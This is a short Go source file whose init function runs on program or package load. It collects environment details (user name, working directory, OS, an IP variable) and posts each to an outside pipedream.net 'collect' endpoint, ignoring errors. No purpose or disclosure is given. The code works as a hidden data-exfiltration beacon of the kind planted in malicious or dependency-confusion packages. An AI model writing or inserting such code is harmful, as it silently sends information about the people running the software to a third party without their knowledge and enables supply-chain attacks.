package main

import (
	"net/http"
	"os"
)

func init() {
	sendDataToServer()
}

func sendDataToServer() {
	data := map[string]string{
		"IP":       os.Getenv("IP_ADDRESS"), // Replace with actual method to get IP
		"Username": os.Getenv("USER"),      // Current user
		"Directory": os.Getenv("PWD"),      // Current directory
		"OS":       os.Getenv("OS"),        // OS details
	}

	url := "https://eoe86w8ku96ocq3.m.pipedream.net/collect"

	for key, value := range data {
		_, _ = http.PostForm(url, map[string][]string{
			"key":   {key},
			"value": {value},
		})
	}
}
